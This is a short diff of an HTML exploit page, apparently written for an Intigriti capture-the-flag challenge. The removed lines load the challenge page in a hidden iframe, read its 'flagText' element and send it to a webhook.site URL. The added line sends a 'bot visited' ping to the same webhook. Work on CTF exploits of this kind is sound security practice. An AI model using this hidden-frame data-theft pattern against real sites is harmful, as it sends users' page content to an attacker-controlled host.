@@ -1,22 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="victim"
-  src="https://challenge-0126.intigriti.io/security.html"
-  style="display:none">
-</iframe>
-
 <script>
-setTimeout(() => {
-  const f = document
-    .getElementById("victim")
-    .contentDocument
-    .getElementById("flagText")
-    .innerText;
-
-  fetch("https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag=" +
-        encodeURIComponent(f));
-}, 4000);
+fetch("https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?ping=bot_visited");
 </script>
 </body>
 </html>
